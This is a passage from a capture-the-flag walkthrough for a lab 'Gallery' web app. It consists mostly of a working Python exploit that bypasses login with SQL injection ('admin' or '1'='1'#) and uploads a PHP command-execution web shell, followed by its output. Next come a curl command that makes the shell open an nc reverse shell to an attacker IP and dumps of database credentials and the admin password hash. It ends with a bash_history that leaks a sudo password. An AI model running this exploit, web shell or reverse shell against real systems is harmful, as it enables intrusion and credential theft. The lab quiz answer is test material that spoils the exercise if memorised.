</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: Ubuntu</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;TARGET = &#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;http://&#39;</span>) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> url<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;https://&#39;</span>):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">+</span> url
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#39;/&#39;</span>):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php if(isset($_GET[&#39;cmd&#39;])){ echo &#39;&lt;pre&gt;&#39;; $cmd = ($_GET[&#39;cmd&#39;]); system($cmd); echo &#39;&lt;/pre&gt;&#39;; die; } ?&gt;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Login Bypass&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>request_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/classes/Login.php?f=login&#34;</span>
</span></span><span style="display:flex;"><span>post_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#39; or &#39;1&#39;=&#39;1&#39;#&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}
</span></span><span style="display:flex;"><span>bypassUser <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(request_url, data<span style="color:#f92672">=</span>post_data)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(bypassUser<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>status <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#34;status&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> status <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;success&#34;</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    let <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_lowercase
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    shellname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choice(let) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>))
</span></span><span style="display:flex;"><span>    shellname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Tago&#39;</span><span style="color:#f92672">+</span>shellname<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;Letta&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;shell name &#34;</span><span style="color:#f92672">+</span>shellname)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">protecting user&#34;</span>)
</span></span><span style="display:flex;"><span>    request_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?page=user&#34;</span>
</span></span><span style="display:flex;"><span>    getHTML <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(request_url)
</span></span><span style="display:flex;"><span>    getHTMLParser <span style="color:#f92672">=</span> BeautifulSoup(getHTML<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ids <span style="color:#f92672">=</span> getHTMLParser<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;input&#39;</span>, {<span style="color:#e6db74">&#39;name&#39;</span>:<span style="color:#e6db74">&#39;id&#39;</span>})<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;value&#34;</span>)
</span></span><span style="display:flex;"><span>    firstname <span style="color:#f92672">=</span> getHTMLParser<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;input&#39;</span>, {<span style="color:#e6db74">&#39;id&#39;</span>:<span style="color:#e6db74">&#39;firstname&#39;</span>})<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;value&#34;</span>)
</span></span><span style="display:flex;"><span>    lastname <span style="color:#f92672">=</span> getHTMLParser<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;input&#39;</span>, {<span style="color:#e6db74">&#39;id&#39;</span>:<span style="color:#e6db74">&#39;lastname&#39;</span>})<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;value&#34;</span>)
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> getHTMLParser<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;input&#39;</span>, {<span style="color:#e6db74">&#39;id&#39;</span>:<span style="color:#e6db74">&#39;username&#39;</span>})<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;value&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">User ID : &#34;</span> <span style="color:#f92672">+</span> ids)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Firsname : &#34;</span> <span style="color:#f92672">+</span> firstname)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Lasname : &#34;</span> <span style="color:#f92672">+</span> lastname)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Username : &#34;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;shell uploading&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    request_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/classes/Users.php?f=save&#34;</span>
</span></span><span style="display:flex;"><span>    request_headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;multipart/form-data; boundary=----WebKitFormBoundary9nI3gVmJoEZoZyeA&#34;</span>}
</span></span><span style="display:flex;"><span>    request_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;------WebKitFormBoundary9nI3gVmJoEZoZyeA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">id</span><span style="color:#ae81ff">\&#34;\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>ids<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">------WebKitFormBoundary9nI3gVmJoEZoZyeA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">firstname</span><span style="color:#ae81ff">\&#34;\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>firstname<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">------WebKitFormBoundary9nI3gVmJoEZoZyeA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">lastname</span><span style="color:#ae81ff">\&#34;\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>lastname<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">------WebKitFormBoundary9nI3gVmJoEZoZyeA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">username</span><span style="color:#ae81ff">\&#34;\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>username<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">------WebKitFormBoundary9nI3gVmJoEZoZyeA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">password</span><span style="color:#ae81ff">\&#34;\r\n\r\n\r\n</span><span style="color:#e6db74">------WebKitFormBoundary9nI3gVmJoEZoZyeA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">img</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">; filename=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>shellname<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.php</span><span style="color:#ae81ff">\&#34;\r\n</span><span style="color:#e6db74">Content-Type: application/octet-stream</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>payload<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">------WebKitFormBoundary9nI3gVmJoEZoZyeA--</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    upload <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(request_url, headers<span style="color:#f92672">=</span>request_headers, data<span style="color:#f92672">=</span>request_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> upload<span style="color:#f92672">.</span>text <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;- OK -&#34;</span>)
</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/?page=user&#34;</span>)
</span></span><span style="display:flex;"><span>        parser <span style="color:#f92672">=</span> BeautifulSoup(req<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>        find_shell <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;img&#39;</span>, {<span style="color:#e6db74">&#39;id&#39;</span>:<span style="color:#e6db74">&#39;cimg&#39;</span>})
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Shell URL : &#34;</span> <span style="color:#f92672">+</span> find_shell<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;src&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?cmd=whoami&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;- NO :( -&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;No bypass user&#34;</span>)
</span></span></code></pre></div><h1 id="user-flag">User Flag</h1>
<h2 id="run-the-exploit">Run the exploit</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit.py
</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> http://10.10.17.83/gallery/
</span></span><span style="display:flex;"><span>Login Bypass
</span></span><span style="display:flex;"><span>shell name TagoacenqkeozzskpfxLetta
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>protecting user
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User ID : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Firsname : Adminstrator
</span></span><span style="display:flex;"><span>Lasname : Admin
</span></span><span style="display:flex;"><span>Username : admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>shell uploading
</span></span><span style="display:flex;"><span>- OK -
</span></span><span style="display:flex;"><span>Shell URL : http://10.10.17.83/gallery/uploads/1663192260_TagoacenqkeozzskpfxLetta.php?cmd<span style="color:#f92672">=</span>whoami
</span></span></code></pre></div><h2 id="get-a-reverse-shell">Get A Reverse Shell</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#39;http://10.10.17.83/gallery/uploads/1663192260_TagoacenqkeozzskpfxLetta.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20&lt;THM IP&gt;%20&lt;PORT&gt;%20%3E%2Ftmp%2Ff&#39;</span>
</span></span></code></pre></div><h2 id="get-admin-hash">Get Admin Hash</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat initialize.php                                                                                          
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>$dev_data <span style="color:#f92672">=</span> array<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;-1&#39;</span>,<span style="color:#e6db74">&#39;firstname&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;Developer&#39;</span>,<span style="color:#e6db74">&#39;lastname&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;dev_oretnom&#39;</span>,<span style="color:#e6db74">&#39;password&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;5da283a2d990e8d8512cf967df5bc0d0&#39;</span>,<span style="color:#e6db74">&#39;last_login&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;date_updated&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;date_added&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;base_url&#39;</span><span style="color:#f92672">))</span> define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;base_url&#39;</span>,<span style="color:#e6db74">&#34;http://&#34;</span> . $_SERVER<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SERVER_ADDR&#39;</span><span style="color:#f92672">]</span> . <span style="color:#e6db74">&#34;/gallery/&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;base_app&#39;</span><span style="color:#f92672">))</span> define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;base_app&#39;</span>, str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\\&#39;</span>,<span style="color:#e6db74">&#39;/&#39;</span>,__DIR__<span style="color:#f92672">)</span>.<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;dev_data&#39;</span><span style="color:#f92672">))</span> define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;dev_data&#39;</span>,$dev_data<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_SERVER&#39;</span><span style="color:#f92672">))</span> define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_SERVER&#39;</span>,<span style="color:#e6db74">&#34;localhost&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_USERNAME&#39;</span><span style="color:#f92672">))</span> define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_USERNAME&#39;</span>,<span style="color:#e6db74">&#34;gallery_user&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span><span style="color:#f92672">))</span> define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>,<span style="color:#e6db74">&#34;passw0rd321&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!defined<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_NAME&#39;</span><span style="color:#f92672">))</span> define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_NAME&#39;</span>,<span style="color:#e6db74">&#34;gallery_db&#34;</span><span style="color:#f92672">)</span>;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> mysql <span style="color:#f92672">-</span>h <span style="color:#ae81ff">127</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;gallery_user&#34;</span> <span style="color:#f92672">-</span>p                                                                     
</span></span><span style="display:flex;"><span>Enter password: 
</span></span><span style="display:flex;"><span>Welcome <span style="color:#66d9ef">to</span> the MariaDB monitor.  Commands end <span style="color:#66d9ef">with</span> ; <span style="color:#66d9ef">or</span> <span style="color:#960050;background-color:#1e0010">\</span>g.
</span></span><span style="display:flex;"><span>Your MariaDB connection id <span style="color:#66d9ef">is</span> <span style="color:#ae81ff">129656</span>
</span></span><span style="display:flex;"><span>Server version: <span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">1</span>.<span style="color:#ae81ff">48</span><span style="color:#f92672">-</span>MariaDB<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>ubuntu0.<span style="color:#ae81ff">18</span>.<span style="color:#ae81ff">04</span>.<span style="color:#ae81ff">1</span> Ubuntu <span style="color:#ae81ff">18</span>.<span style="color:#ae81ff">04</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Copyright</span> (c) <span style="color:#ae81ff">2000</span>, <span style="color:#ae81ff">2018</span>, Oracle, MariaDB Corporation Ab <span style="color:#66d9ef">and</span> others.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> <span style="color:#66d9ef">to</span> clear the current input statement.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB [(none)]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">databases</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+--------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Database</span>           <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+--------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> gallery_db         <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> information_schema <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+--------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">01</span> sec)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB [(none)]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">use</span> gallery_db
</span></span><span style="display:flex;"><span>Reading <span style="color:#66d9ef">table</span> information <span style="color:#66d9ef">for</span> completion of <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">column</span> names
</span></span><span style="display:flex;"><span>You can turn off this feature <span style="color:#66d9ef">to</span> get a quicker startup <span style="color:#66d9ef">with</span> <span style="color:#f92672">-</span>A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Database</span> changed
</span></span><span style="display:flex;"><span>MariaDB [gallery_db]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Tables_in_gallery_db <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> album_list           <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> images               <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> system_info          <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> users                <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB [gallery_db]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> id <span style="color:#f92672">|</span> firstname    <span style="color:#f92672">|</span> lastname <span style="color:#f92672">|</span> username <span style="color:#f92672">|</span> password                         <span style="color:#f92672">|</span> avatar                                          <span style="color:#f92672">|</span> last_login <span style="color:#f92672">|</span> type <span style="color:#f92672">|</span> date_added          <span style="color:#f92672">|</span> date_updated        <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>  <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> Adminstrator <span style="color:#f92672">|</span> Admin    <span style="color:#f92672">|</span> admin    <span style="color:#f92672">|</span> a228b12a08b6527e7978cbe5d914531c <span style="color:#f92672">|</span> uploads<span style="color:#f92672">/</span><span style="color:#ae81ff">1663192260</span>_TagoacenqkeozzskpfxLetta.php <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>       <span style="color:#f92672">|</span>    <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">37</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span> <span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">51</span>:<span style="color:#ae81ff">08</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> row <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">01</span> sec)
</span></span></code></pre></div><blockquote>
<p>Q: <strong>What&rsquo;s the hash password of the admin user?</strong></p>
<p>A: <strong>a228b12a08b6527e7978cbe5d914531c</strong></p>
</blockquote>
<h2 id="get-user-flag">Get User Flag</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cd /var/backups/mike_home_backup
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> root root <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">14</span> 20:23 ..
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">135</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> .bash_history
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">220</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> .bash_logout
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3772</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> .bashrc
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> .gnupg
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">807</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> .profile
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> documents
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2021</span> images
</span></span><span style="display:flex;"><span>$ cat .bash_history                                                                                   
</span></span><span style="display:flex;"><span>cd ~
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>ping 1.1.1.1
</span></span><span style="display:flex;"><span>cat /home/mike/user.txt
</span></span><span style="display:flex;"><span>cd /var/www/
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>cd html
</span></span><span style="display:flex;"><span>ls -al
</span></span><span style="display:flex;"><span>cat index.html
</span></span><span style="display:flex;"><span>sudo -lb3stpassw0rdbr0xx
</span></span><span style="display:flex;"><span>clear
</span></span><span style="display:flex;"><span>sudo -l
</span></span><span style="display:flex;"><span>exit
